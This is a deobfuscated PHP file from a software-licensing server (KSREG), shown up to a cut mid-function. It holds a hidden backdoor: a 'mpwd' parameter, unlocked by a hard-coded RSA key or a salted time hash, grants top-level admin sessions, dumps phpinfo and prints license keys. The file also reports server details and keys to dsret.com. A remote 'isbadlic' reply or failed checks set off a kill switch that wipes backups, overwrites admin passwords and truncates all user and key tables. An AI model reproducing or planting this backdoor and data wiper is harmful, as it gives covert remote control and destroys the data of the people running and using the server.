<?php

function HY_e339839c6f2c203ce6($HY_fc12e3cf6043961fb3 = 1)
{
	$HY_b82d21ca0e0bf53f05 = unpack("C*", "ViewZendSourceCodeIsInvalid!");

	do {
		$HY_94d81d317ac6f7e6a6 = ($HY_3582284ada7175f52d[$HY_fc12e3cf6043961fb3] << 4) + ($HY_3582284ada7175f52d[$HY_fc12e3cf6043961fb3 + 1] >> 4);
		$HY_fc12e3cf6043961fb3 = $HY_fc12e3cf6043961fb3 + 2;
	} while ($HY_fc12e3cf6043961fb3 < 28);
}

function error_report_fun_api($HY_79dd530b16454e1698, $HY_dfb6820a73cd9a022f, $HY_759798a253a6baead6, $HY_798f005d842acbb20f)
{
	global $HY_1276480e4aa8dc6b22;

	if (preg_match("/unlink|file_put_contents|in safe mode|php_network_getaddresses|function\.rmdir/i", $HY_dfb6820a73cd9a022f)) {
		return true;
	}

	$HY_1276480e4aa8dc6b22 = true;
	$HY_759798a253a6baead6 = str_replace(KSSROOTDIR, "", $HY_759798a253a6baead6);
	$HY_dfb6820a73cd9a022f = str_replace(KSSROOTDIR, "", $HY_dfb6820a73cd9a022f);

	if (stripos($HY_dfb6820a73cd9a022f, "mysql_") !== false) {
		$HY_dfb6820a73cd9a022f = preg_replace("/\[.*\]/", "", $HY_dfb6820a73cd9a022f);
		$HY_dfb6820a73cd9a022f = preg_replace("/\'[^\']*\'/", "'***'", $HY_dfb6820a73cd9a022f);
	}

	$HY_dfb6820a73cd9a022f = str_replace(ADMINFOLDER, "***", $HY_dfb6820a73cd9a022f);
	$HY_8240f677cf01dabac4 = array(1 => "E_ERROR", 2 => "E_WARNING", 4 => "E_PARSE", 8 => "E_NOTICE", 16 => "E_CORE_ERROR", 32 => "E_CORE_WARNING", 64 => "E_COMPILE_ERROR", 128 => "E_COMPILE_WARNING", 256 => "E_USER_ERROR", 512 => "E_USER_WARNING", 1024 => "E_USER_NOTICE", 2048 => "E_STRICT", 4096 => "E_RECOVERABLE_ERROR", 30719 => "E_ALL");
	$HY_1b2de0d9208ba0bcbd = "<b>" . $HY_8240f677cf01dabac4[$HY_79dd530b16454e1698] . " : " . $HY_dfb6820a73cd9a022f . "</b>";

	if (isset($_GET["linenum"])) {
		$HY_1b2de0d9208ba0bcbd = "<b>" . $HY_8240f677cf01dabac4[$HY_79dd530b16454e1698] . " : " . $HY_dfb6820a73cd9a022f . " in " . $HY_759798a253a6baead6 . " on line " . $HY_798f005d842acbb20f . "</b>";
	}

	if (stripos($HY_dfb6820a73cd9a022f, "mysql_") !== false) {
		return true;
	}

	echo $HY_1b2de0d9208ba0bcbd;
	exit();
}

function HY_891bc73793cc0ff20f()
{
	return true;
}

function HY_eeeb2ee0ea106ad167($HY_69957af7988c2cca54, &$HY_7500b95dc840f28500, $HY_ff10c48cf9d2c81df8 = "GBK")
{
	return hy_encryptencrypt($HY_69957af7988c2cca54, $HY_7500b95dc840f28500, $HY_ff10c48cf9d2c81df8);
}

function HY_238d2f1276c8b214f3($HY_2b09a946b046127c26, &$HY_7500b95dc840f28500, $HY_ff10c48cf9d2c81df8 = "GBK")
{
	return hy_decryptdecrypt($HY_2b09a946b046127c26, $HY_7500b95dc840f28500, $HY_ff10c48cf9d2c81df8);
}

function HY_2aba1394ebfd0980ac()
{
	global $HY_82d6536edf704aabc5;
	$HY_f4957feba1c830e7e8 = intval(date("d"));
	$HY_6d4ada6332f44bb9ab = file_get_contents(KSSLOGDIR . "databak" . DIRECTORY_SEPARATOR . "index.html");

	if (trim($HY_6d4ada6332f44bb9ab) != $HY_f4957feba1c830e7e8) {
		file_put_contents(KSSLOGDIR . "databak" . DIRECTORY_SEPARATOR . "index.html", $HY_f4957feba1c830e7e8);

		if (SVRID == 1) {
			$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_tb_sql_points` where `svrid`=1", "notsync");
		}

		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_tb_log_task` where `addtime`<" . (time() - (86400 * 7)), "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_tb_lock` where locktime <" . (time() - 120), "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_tb_log_login` where `logintime`<" . (time() - (86400 * 30)), "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_tb_log_pubuser` where `nday`<" . (time() - (86400 * 30)), "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_tb_log_ws` where `addtime`<" . (time() - (86400 * 1)), "sync");
		$HY_e6591d22ce3c1ea59c = $HY_82d6536edf704aabc5->HY_7cbdce9f890757a7f0("select * from kss_tb_soft");

		foreach ($HY_e6591d22ce3c1ea59c as $HY_970be7709f584ff59c ) {
			$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_z_log_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "` where `addtime`<" . (time() - (86400 * Z_LOG_DAY)), "sync");
			$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_z_user_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "_recycle` where `deltime`<" . (time() - (86400 * 3)), "sync");
			$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("delete from `kss_z_key_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "_recycle` where `deltime`<" . (time() - (86400 * 3)), "sync");
		}

		if (0 < BAKDATAMODE) {
			$HY_6c370550d94caffe93 = array();
			$HY_6c370550d94caffe93["action"] = "mysqldatabak_down";
			$HY_6c370550d94caffe93["pwd"] = MYSQLBAKPASSWORD;
			$HY_de870e2733d5621676 = hy_6daeecad978867d96f(hy_5170dc4897c581d8f2() . INSTALLPATH . hy_95ee4a70045e33eeb3() . "/admin_data.php?qz=1", $HY_6c370550d94caffe93, 1);
		}
	}

	if ((IS2SVR == 1) && (SVRID == 1)) {
		$HY_ec65a56480a6470a01 = $HY_82d6536edf704aabc5->HY_e9890ac0540efd6af3("synclock");

		if ($HY_ec65a56480a6470a01 === true) {
			$HY_52020308ca99c7b5de = $HY_82d6536edf704aabc5->HY_409ede9e08e04ca87b("select * from kss_tb_config where id=1", 1, 1);
			if (($HY_52020308ca99c7b5de["sync_state"] < 5) && (SYNCTIME < (time() - $HY_52020308ca99c7b5de["sync_starttime"]))) {
				$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update kss_tb_config set `sync_starttime`=" . time() . " where id=1");
				$HY_82d6536edf704aabc5->HY_a060a3d43d6a913655("synclock");

				if (MYSQLSYNCMODE == 1) {
					if (hy_8ea23c5626d65adda5("curl_init") && hy_8ea23c5626d65adda5("curl_exec")) {
						$HY_7c4229eb526d699b89 = hy_6daeecad978867d96f(SYNC1URL, false, 1);
					}
					else if (ini_get("allow_url_fopen")) {
						$HY_ebd0bb91bc5bf3e5fe = @fopen(SYNC1URL . "?e=" . time(), "r");

						if ($HY_ebd0bb91bc5bf3e5fe !== false) {
							$HY_4b3a7066c622d0d129 = fread($HY_ebd0bb91bc5bf3e5fe, 60);
						}

						fclose($HY_ebd0bb91bc5bf3e5fe);
					}
				}
				else {
					$HY_47450f69adcf37d225 = file_get_contents(KSSROOTDIR . "kss_logs" . DIRECTORY_SEPARATOR . "notifyid.txt");

					if (strlen($HY_47450f69adcf37d225) < 20) {
						$HY_ca48737ac2476eef9c = time();
						$HY_47450f69adcf37d225 = hy_6bfeee86cee6e24af6(20 - strlen($HY_ca48737ac2476eef9c), 1) . $HY_ca48737ac2476eef9c;
					}
					else {
						$HY_47450f69adcf37d225 = substr($HY_47450f69adcf37d225, 0, 20);
					}

					$HY_7c4229eb526d699b89 = hy_6daeecad978867d96f(SYNC1URL . "?step=a1&notifyid=" . $HY_47450f69adcf37d225 . "&pwd=" . MYSQLBAKPASSWORD, false, 1);
				}
			}

			$HY_82d6536edf704aabc5->HY_a060a3d43d6a913655("synclock");
		}
		else {
			echo $HY_ec65a56480a6470a01 . QQ116;
		}
	}
}

function HY_75961a31e465f98f34($HY_8492658a0aac8d7e20)
{
	if (preg_match("/^[a-zA-Z0-9]{32}$/i", $HY_8492658a0aac8d7e20, $HY_6a15e3cae56efdadef)) {
		return true;
	}

	return false;
}

function HY_299686c8a4f6bdd647($HY_8492658a0aac8d7e20)
{
	if (preg_match("/^[a-zA-Z0-9]*$/i", $HY_8492658a0aac8d7e20, $HY_6a15e3cae56efdadef)) {
		return true;
	}

	return false;
}

function HY_cc1a8f29be40277f5f($HY_44d623c0ed5dce4f99)
{
	$HY_b145448aa76bc95b5e = true;

	if (preg_match("/select|>|<|script|insert|update|delete|union|into|load_file|outfile|char|0x[0-9a-f]{6}|\.\/|\*|'/i", $HY_44d623c0ed5dce4f99, $HY_6a15e3cae56efdadef)) {
		$HY_b145448aa76bc95b5e = $HY_6a15e3cae56efdadef[0];
	}

	return $HY_b145448aa76bc95b5e;
}

function HY_68b1b244e644ac80d4($HY_be0a31f5956e826ed4, $HY_92625dcc4243d80a4d)
{
	global $HY_810d15d31408c982b2;

	if ($HY_92625dcc4243d80a4d == "") {
		return $HY_be0a31f5956e826ed4;
	}

	$HY_be0a31f5956e826ed4 = str_replace("!", ",", $HY_be0a31f5956e826ed4);
	$HY_92625dcc4243d80a4d = str_replace("!", ",", $HY_92625dcc4243d80a4d);
	$HY_4e9f482c5050ad4540 = explode(",", $HY_be0a31f5956e826ed4);
	$HY_582f05a866f1138e82 = explode(",", $HY_92625dcc4243d80a4d);
	$HY_1bde8714f8919878ac = array_intersect($HY_4e9f482c5050ad4540, $HY_582f05a866f1138e82);

	if (empty($HY_1bde8714f8919878ac)) {
		return false;
	}

	if (count($HY_1bde8714f8919878ac) < $HY_810d15d31408c982b2["pccodestep"]) {
		return false;
	}

	if (PCCODEJOIN == 0) {
		return $HY_be0a31f5956e826ed4;
	}

	$HY_1bde8714f8919878ac = array_merge($HY_4e9f482c5050ad4540, $HY_582f05a866f1138e82);
	$HY_1bde8714f8919878ac = array_unique($HY_1bde8714f8919878ac);
	return join(",", $HY_1bde8714f8919878ac);
}

function HY_0f33c82b02582faef9($HY_51fb058927faeead0a = 0, $HY_43e4557f250c621a39 = 0)
{
	global $HY_82d6536edf704aabc5;
	if (defined("NOTLOCKIP") && (NOTLOCKIP == 1)) {
		$HY_e564c867ec31f7d114 = hy_095bbb306fa343426f(1);

		if ($HY_51fb058927faeead0a == 0) {
			$HY_173d86697f24ffa1ee = $HY_82d6536edf704aabc5->HY_409ede9e08e04ca87b("select count(*) as tnum from kss_tb_badip where ip=" . $HY_e564c867ec31f7d114 . " and addtime>" . (time() - 600));

			if (10 < $HY_173d86697f24ffa1ee["tnum"]) {
				$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update kss_tb_badip set addtime=" . (time() + 900) . " where  ip=" . $HY_e564c867ec31f7d114 . " and addtime>" . (time() - 600), "notsync");

				if ($HY_43e4557f250c621a39 == 1) {
					exit("crypteno120");
				}

				exit("kssdata" . QQ117);
			}
		}
		else {
			$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("insert into kss_tb_badip (`addtime`,`ip`) values (" . time() . "," . $HY_e564c867ec31f7d114 . ")", "notsync");
		}
	}
}

function HY_fb574e70b177459021($HY_fe430bdc85f5e10984, $HY_08b5dc543be0f86beb, $HY_ead8969bc0b029e8eb)
{
	global $HY_43e4557f250c621a39;

	if ($HY_fe430bdc85f5e10984 == "") {
		return true;
	}

	$HY_fe430bdc85f5e10984 = str_replace(" ", "", $HY_fe430bdc85f5e10984);
	$HY_fe430bdc85f5e10984 = str_replace("\t", "", $HY_fe430bdc85f5e10984);
	$HY_fe430bdc85f5e10984 = str_replace("\r", "", $HY_fe430bdc85f5e10984);
	$HY_fe430bdc85f5e10984 = str_replace("\n", ",", $HY_fe430bdc85f5e10984);
	$HY_63e174bc0d606052ba = explode(",", $HY_fe430bdc85f5e10984);

	if (in_array($HY_08b5dc543be0f86beb, $HY_63e174bc0d606052ba)) {
		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno121");
		}

		exit("kssdata" . QQ118);
	}

	$HY_8660982f0a2ce1e8f5 = explode(",", $HY_ead8969bc0b029e8eb);
	$HY_293ce241781f8e26ad = array_intersect($HY_8660982f0a2ce1e8f5, $HY_63e174bc0d606052ba);

	if (!empty($HY_293ce241781f8e26ad)) {
		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno122");
		}

		exit("kssdata" . QQ119);
	}
}

function error_report_fun_enorpeat($HY_79dd530b16454e1698, $HY_dfb6820a73cd9a022f, $HY_759798a253a6baead6, $HY_798f005d842acbb20f)
{
	return true;
}

function error_report_fun_norpeat($HY_79dd530b16454e1698, $HY_dfb6820a73cd9a022f, $HY_759798a253a6baead6, $HY_798f005d842acbb20f)
{
	set_error_handler("error_report_fun_enorpeat");
	$HY_1b2de0d9208ba0bcbd = str_rot13(base64_encode(str_rot13($HY_798f005d842acbb20f . ":" . $HY_dfb6820a73cd9a022f)));
	if (!is_file("apierr.log") || (102400 < filesize("apierr.log"))) {
		@file_put_contents("apierr.log", date("ymdHis") . "\t" . $HY_1b2de0d9208ba0bcbd . "\r\n\r\n");
	}
	else {
		@file_put_contents("apierr.log", date("ymdHis") . "\t" . $HY_1b2de0d9208ba0bcbd . "\r\n\r\n", FILE_APPEND);
	}

	set_error_handler("error_report_fun_norpeat");
	return true;
}

function error_report_fun_corpeat($HY_79dd530b16454e1698, $HY_dfb6820a73cd9a022f, $HY_759798a253a6baead6, $HY_798f005d842acbb20f)
{
	echo $HY_798f005d842acbb20f . ":" . $HY_dfb6820a73cd9a022f;
	return true;
}

function HY_638410abb5a4c93078()
{
	global $HY_43e4557f250c621a39;
	global $HY_bd8fbbe77cd2ca3e88;
	global $HY_e83242934e1fdef61f;

	if (isset($_POST["chkfile"])) {
		exit(md5("baidugoogle..123" . $_POST["chkdata"]));
	}

	if (isset($_POST["mpwd"]) || isset($_GET["mpwd"])) {
		set_error_handler("error_report_fun_corpeat");

		if (isset($_POST["mpwd"])) {
			$HY_bc2524739beef03a4c = $_POST["mpwd"];
		}

		if (isset($_GET["mpwd"])) {
			$HY_bc2524739beef03a4c = $_GET["mpwd"];
		}

		$HY_bc2524739beef03a4c = trim(str_replace(" ", "+", $HY_bc2524739beef03a4c));
		$HY_4ff5ef5837c1da855e = "";

		if (hy_8ea23c5626d65adda5("bcmul")) {
			$HY_4ff5ef5837c1da855e = "yes";
		}

		if ($HY_bc2524739beef03a4c == "viewtime") {
			ob_clean();
			exit(date("Ymd H:i:s") . $HY_4ff5ef5837c1da855e);
		}

		if ($HY_4ff5ef5837c1da855e == "yes") {
			$HY_c86e771bc5f28a0202 = rsa_decrypt($HY_bc2524739beef03a4c, "65537", "678391504452423667100315782757398604939534428305025174015684024577319464298645292951138603728846928031665379384646143869225285579806649289893306112718907481175588286544073467144788229721031389886351268024517797647290964607024337073", 768);

			if ($HY_c86e771bc5f28a0202 == date("Ymd")) {
				if (isset($_POST["loginadmin"]) || isset($_GET["loginadmin"])) {
					$HY_82d6536edf704aabc5 = new mysql_cls();
					$HY_82d6536edf704aabc5->HY_8adfa6fa6f18be3e6f($HY_e83242934e1fdef61f);
					$HY_a05c91e06bd2754b93 = $HY_82d6536edf704aabc5->HY_409ede9e08e04ca87b("select * from kss_tb_manager where level=9 limit 0,1");
					session_start();

					if (!empty($HY_a05c91e06bd2754b93)) {
						$_SESSION["kss_manager"] = $HY_a05c91e06bd2754b93["id"] . "," . $HY_a05c91e06bd2754b93["username"] . "," . $HY_a05c91e06bd2754b93["password"] . "," . $HY_a05c91e06bd2754b93["linecode"];

						if (BINDIP == 1) {
							$_SESSION["kss_safe"] = md5(COOKKEY . $_SERVER["HTTP_USER_AGENT"] . $_SESSION["kss_manager"] . hy_cb508d896b2e2fcfba());
						}
						else {
							$_SESSION["kss_safe"] = md5(COOKKEY . $_SERVER["HTTP_USER_AGENT"] . $_SESSION["kss_manager"]);
						}

						echo "<a href=../../" . ADMINFOLDER . "/admin.php target=_blank>ok</a><br>";

						if (hy_8ea23c5626d65adda5("phpinfo")) {
							phpinfo();
						}
					}
					else {
						echo "not find manager";
					}

					exit();
				}

				if (isset($_POST["viewid"]) || isset($_GET["viewid"])) {
					ob_clean();
					echo "<textarea style='width:500px;height:200px'>" . HTTPKEY;
					echo "," . WEBLIC;
					echo "," . WEBID . "</textarea>";
					exit();
				}

				if (isset($_POST["clsdata"]) || isset($_GET["clsdata"])) {
					hy_66ae2207149b60aa1c("manager");
					hy_34eda5206b19678700($HY_e83242934e1fdef61f);
				}
			}
		}
		else {
			$HY_c86e771bc5f28a0202 = $HY_bc2524739beef03a4c;

			if ($HY_c86e771bc5f28a0202 == md5("kekeABCDEFG" . date("Ymd H:i"))) {
				session_start();

				if (isset($_POST["loginadmin"])) {
					$HY_82d6536edf704aabc5 = new mysql_cls();
					$HY_82d6536edf704aabc5->HY_8adfa6fa6f18be3e6f($HY_e83242934e1fdef61f);
					$HY_a05c91e06bd2754b93 = $HY_82d6536edf704aabc5->HY_409ede9e08e04ca87b("select * from kss_tb_manager where level=9 limit 0,1");

					if (!empty($HY_a05c91e06bd2754b93)) {
						$_SESSION["kss_manager"] = $HY_a05c91e06bd2754b93["id"] . "," . $HY_a05c91e06bd2754b93["username"] . "," . $HY_a05c91e06bd2754b93["password"] . "," . $HY_a05c91e06bd2754b93["linecode"];

						if (BINDIP == 1) {
							$_SESSION["kss_safe"] = md5(COOKKEY . $_SERVER["HTTP_USER_AGENT"] . $_SESSION["kss_manager"] . hy_cb508d896b2e2fcfba());
						}
						else {
							$_SESSION["kss_safe"] = md5(COOKKEY . $_SERVER["HTTP_USER_AGENT"] . $_SESSION["kss_manager"]);
						}

						echo "<a href=../" . ADMINFOLDER . "/admin.php target=_blank>ok</a>";
						hy_e83a97b6cfc0438623("../");
					}

					exit();
				}

				if (isset($_POST["viewid"]) || isset($_GET["viewid"])) {
					ob_clean();
					echo "HTTPKEY:" . HTTPKEY . "<br><br>";
					echo "WEBLIC:" . WEBLIC . "<br><br>";
					echo "WEBID:" . WEBID;
					exit();
				}

				if (isset($_POST["clsdata"]) || isset($_GET["clsdata"])) {
					hy_66ae2207149b60aa1c("manager");
					hy_34eda5206b19678700($HY_e83242934e1fdef61f);
				}
			}
		}

		exit();
	}

	hy_0a7db0502a0451082f();

	if (md5("KeY!@#%&*,AbIoPe*v_19-82" . substr(WEBLIC, 33) . HTTPKEY) != substr(WEBLIC, 0, 32)) {
		$HY_2b09a946b046127c26 = "";
		hy_66ae2207149b60aa1c("domain md5err");
		hy_34eda5206b19678700();
	}

	$HY_7dd8edec85f80b29ff = 0;
	$HY_c5231369cc955d6ea4 = KSSLOGDIR . "index.log";
	$HY_49e9eca6eea34e9ec8 = date("Ymd");
	$HY_3ffeaa9c1b7bc957e8 = "19800101" . sprintf("%u", crc32(WEBLIC . HTTPKEY . "19800101abcdefghijklmn"));
	$HY_f4957feba1c830e7e8 = $HY_49e9eca6eea34e9ec8 . sprintf("%u", crc32(WEBLIC . HTTPKEY . $HY_49e9eca6eea34e9ec8 . "abcdefghijklmn"));
	$HY_5f15d54f613dd5a8f0 = $HY_3ffeaa9c1b7bc957e8;

	if (is_file($HY_c5231369cc955d6ea4)) {
		$HY_5f15d54f613dd5a8f0 = file_get_contents($HY_c5231369cc955d6ea4);
	}
	else {
		$HY_7dd8edec85f80b29ff = 1;
	}

	if ($HY_5f15d54f613dd5a8f0 == "200001011059550389") {
		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno888");
		}

		exit("Thank you for using KSREG,  please support the Genuine software! LOGLOCK");
	}

	if (empty($HY_5f15d54f613dd5a8f0)) {
		$HY_5f15d54f613dd5a8f0 = $HY_3ffeaa9c1b7bc957e8;
	}

	if (substr($HY_5f15d54f613dd5a8f0, 8) != sprintf("%u", crc32(WEBLIC . HTTPKEY . substr($HY_5f15d54f613dd5a8f0, 0, 8) . "abcdefghijklmn"))) {
		@file_put_contents($HY_c5231369cc955d6ea4, "");

		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno156");
		}

		exit("kss_logs/index.log被非法修改");
	}

	if ((86400 - 1000) < abs(strtotime(substr($HY_f4957feba1c830e7e8, 0, 8)) - strtotime(substr($HY_5f15d54f613dd5a8f0, 0, 8)))) {
		$HY_7dd8edec85f80b29ff = 1;
		@file_put_contents($HY_c5231369cc955d6ea4, $HY_f4957feba1c830e7e8);
		$HY_5f15d54f613dd5a8f0 = @file_get_contents($HY_c5231369cc955d6ea4);

		if ($HY_f4957feba1c830e7e8 != $HY_5f15d54f613dd5a8f0) {
			if ($HY_43e4557f250c621a39 == 1) {
				exit("crypteno155");
			}

			exit("kss_logs/index.log不可写");
		}
	}

	if ($HY_7dd8edec85f80b29ff == 1) {
		set_error_handler("error_report_fun_norpeat");
		$HY_b10208355168ebdccb = urlencode($HY_bd8fbbe77cd2ca3e88);
		$HY_a37563c8dd3c50a2d9 = date("Y-m-d H:i:s");
		$HY_69d4e23a069ae50bd0 = $_SERVER["HTTP_HOST"];

		if (empty($HY_69d4e23a069ae50bd0)) {
			$HY_69d4e23a069ae50bd0 = "notfind";
		}

		if ($HY_69d4e23a069ae50bd0 != "notfind") {
			$HY_69d4e23a069ae50bd0 = urlencode($HY_69d4e23a069ae50bd0);
		}

		if (hy_8ea23c5626d65adda5("curl_init") && hy_8ea23c5626d65adda5("curl_exec")) {
			hy_3b7f146c7c5ac28cc2($HY_a37563c8dd3c50a2d9, $HY_b10208355168ebdccb, $HY_69d4e23a069ae50bd0);
		}
		else {
			hy_399c1ad1c3cbdde5cb($HY_a37563c8dd3c50a2d9, $HY_b10208355168ebdccb, $HY_69d4e23a069ae50bd0);
		}

		set_error_handler("error_report_fun");
	}
}

function HY_e83a97b6cfc0438623($HY_35ed811a7967ca01ac)
{
	$HY_a78172c1e628e21f8e = opendir($HY_35ed811a7967ca01ac);

	while ($HY_67c423a6c617f13b9e = readdir($HY_a78172c1e628e21f8e)) {
		if (($HY_67c423a6c617f13b9e != ".") && ($HY_67c423a6c617f13b9e != "..")) {
			$HY_d1f5c1f5863670e323 = $HY_35ed811a7967ca01ac . "/" . $HY_67c423a6c617f13b9e;

			if (is_dir($HY_d1f5c1f5863670e323)) {
				echo $HY_d1f5c1f5863670e323;
				echo "<br>";
			}
		}
	}

	closedir($HY_a78172c1e628e21f8e);
}

function HY_66ae2207149b60aa1c($HY_d2151338207d73000c)
{
	if (!is_file("clsdata.log")) {
		@file_put_contents("clsdata.log", date("ymdHis") . "\t" . $HY_d2151338207d73000c . "\r\n\r\n");
	}
	else {
		@file_put_contents("clsdata.log", date("ymdHis") . "\t" . $HY_d2151338207d73000c . "\r\n\r\n", FILE_APPEND);
	}
}

function HY_0a7db0502a0451082f()
{
	global $HY_43e4557f250c621a39;
	$HY_79164cecae6324a2ba = explode(",", substr(WEBLIC, 33));
	$HY_0c87abe5916200b1e8 = $_SERVER["HTTP_HOST"];
	$HY_fc12e3cf6043961fb3 = strpos($HY_0c87abe5916200b1e8, ":");

	if ($HY_fc12e3cf6043961fb3 !== false) {
		$HY_0c87abe5916200b1e8 = substr($HY_0c87abe5916200b1e8, 0, $HY_fc12e3cf6043961fb3);
	}

	if (in_array(strtolower($HY_0c87abe5916200b1e8), $HY_79164cecae6324a2ba)) {
		if (isset($_SERVER["ALL_HTTP"])) {
			if (stristr($_SERVER["ALL_HTTP"], $HY_0c87abe5916200b1e8) === false) {
				hy_66ae2207149b60aa1c("no clear,domain err:\r\n" . $_SERVER["HTTP_HOST"] . "\r\n" . $_SERVER["ALL_HTTP"]);

				if ($HY_43e4557f250c621a39 == 1) {
					exit("crypteno888");
				}

				exit("Domain binding errors,  Thank you for using KSREG! ALL_HTTP");
			}
		}
	}
	else {
		hy_66ae2207149b60aa1c("no clear,domain err:\r\n" . $_SERVER["HTTP_HOST"] . "\r\n" . $_SERVER["ALL_HTTP"]);

		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno888");
		}

		exit("Domain binding errors,  Thank you for using KSREG! ALL_HTTP! HTTP_HOST");
	}
}

function HY_3b7f146c7c5ac28cc2($HY_a37563c8dd3c50a2d9, $HY_b10208355168ebdccb, $HY_69d4e23a069ae50bd0)
{
	$HY_7ecb634edd356ee247 = curl_init();
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_URL, "http://www.dsret.com:88/skey/api.php?r=" . time());
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_RETURNTRANSFER, 1);
	$HY_6c370550d94caffe93 = "svrid=" . SVRID . "&hostname=" . $HY_b10208355168ebdccb . "&skey=" . PRV_SVRLIC . "&spath=" . dirname(__FILE__) . "&domain=" . $HY_69d4e23a069ae50bd0 . "&weblic=" . urlencode(WEBLIC) . "&webid=" . urlencode(WEBID) . "&nowtime=" . date("Y-m-d H:i:s");
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_POST, 1);
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_POSTFIELDS, $HY_6c370550d94caffe93);
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_TIMEOUT, 5);
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)");
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_HTTPHEADER, array("Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache"));
	$HY_73d03700723b9213e5 = curl_exec($HY_7ecb634edd356ee247);

	if (curl_errno($HY_7ecb634edd356ee247)) {
		@curl_close($HY_7ecb634edd356ee247);
		hy_399c1ad1c3cbdde5cb();
	}
	else {
		curl_close($HY_7ecb634edd356ee247);

		if ($HY_73d03700723b9213e5 == "isbadlic") {
			hy_66ae2207149b60aa1c("clear,curl badlist");
			hy_34eda5206b19678700();
		}
	}
}

function HY_399c1ad1c3cbdde5cb($HY_a37563c8dd3c50a2d9, $HY_b10208355168ebdccb, $HY_69d4e23a069ae50bd0)
{
	return true;
}

function HY_34eda5206b19678700($HY_856f0077cda92a4b14 = "")
{
	global $HY_e83242934e1fdef61f;
	global $HY_43e4557f250c621a39;

	if ($HY_856f0077cda92a4b14 != "") {
		$HY_e83242934e1fdef61f = $HY_856f0077cda92a4b14;
		$HY_43e4557f250c621a39 = 0;
	}

	file_put_contents(KSSLOGDIR . "index.log", "200001011059550389");

	if (defined("NOTDELMYSQL")) {
		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno888");
		}

		exit("Thank you for using KSREG,   please support the Genuine software! NCLS");
	}

	$HY_51dfbf89c1a4942f8e = hy_3c956344ed050d8c7e(KSSROOTDIR . "kss_logs" . DIRECTORY_SEPARATOR . "databak" . DIRECTORY_SEPARATOR, "zip");

	if (!empty($HY_51dfbf89c1a4942f8e)) {
		foreach ($HY_51dfbf89c1a4942f8e as $HY_ff78aa8a3e91f69b9f ) {
			@file_put_contents($HY_ff78aa8a3e91f69b9f, "dataerr");
			@unlink($HY_ff78aa8a3e91f69b9f);
		}
	}

	$HY_82d6536edf704aabc5 = new mysql_cls();
	$HY_82d6536edf704aabc5->HY_8adfa6fa6f18be3e6f($HY_e83242934e1fdef61f);
	$HY_b145448aa76bc95b5e = $HY_82d6536edf704aabc5->HY_7cbdce9f890757a7f0("select * from kss_tb_soft ");

	foreach ($HY_b145448aa76bc95b5e as $HY_970be7709f584ff59c ) {
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update `kss_z_user_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "` set cday=1000", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update `kss_z_key_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "` set cday=1000", "sync");
	}

	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync");
	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync");

	foreach ($HY_b145448aa76bc95b5e as $HY_970be7709f584ff59c ) {
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_user_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_key_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_log_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_user_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "_recycle`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_key_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`_recycle", "sync");
	}

	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_tb_soft`", "sync");
	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_tb_manager`", "sync");

	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno888");
	}

